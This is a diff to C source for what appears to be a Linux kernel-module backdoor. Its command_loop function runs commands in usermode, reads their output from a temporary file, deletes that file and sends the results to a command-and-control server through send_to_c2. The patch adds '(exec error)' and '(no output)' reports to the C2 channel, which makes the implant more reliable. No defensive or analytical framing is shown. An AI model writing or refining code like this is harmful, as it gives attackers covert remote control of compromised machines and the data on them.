@@ -162,8 +162,9 @@ static int command_loop(void *data) {
 
         ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
         if (ret)
-            continue;
+            send_to_c2("(exec error)\n", 13);
 
+        int sent_output = 0;
         f = filp_open(tmp_output_path, O_RDONLY, 0);
         if (!IS_ERR(f)) {
             pos = 0;
@@ -173,6 +174,7 @@ static int command_loop(void *data) {
                 if (rlen > 0) {
                     send_to_c2(outbuf, rlen);
                     pos += rlen;
+                    sent_output = 1;
                 }
             } while (rlen > 0);
             filp_close(f, NULL);
@@ -181,6 +183,11 @@ static int command_loop(void *data) {
             if (kern_path(tmp_output_path, 0, &path) == 0)
                 vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
         }
+
+        if (!sent_output) {
+            send_to_c2("(no output)\n", 12);
+        }
+
         send_to_c2("--EOF--\n", 8);
     }
     return 0;
